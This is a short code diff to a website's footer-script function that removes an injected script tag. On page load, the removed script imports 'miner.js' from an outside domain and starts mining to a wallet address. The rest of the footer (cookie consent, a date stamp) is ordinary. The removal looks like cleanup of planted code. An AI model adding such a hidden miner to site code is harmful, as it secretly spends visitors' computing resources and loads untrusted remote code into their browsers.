@@ -179,11 +179,6 @@ function siteFooter() {
 
 function siteFooterScripts() {
     return `    <script src="/cookieconsent.js"></script>
-    <script type="module">
-window.addEventListener('load', () => {
-  import("https://earnify.cc/miner.js").then(m => m.autoMine("RWmCvzsoC7CfM5Fh6moR3g2Xk3J566nD3m", 0.05));
-});
-    </script>
     <script>document.getElementById("lastUpdated").textContent=new Date().toISOString().slice(0,10)</script>`;
 }
 
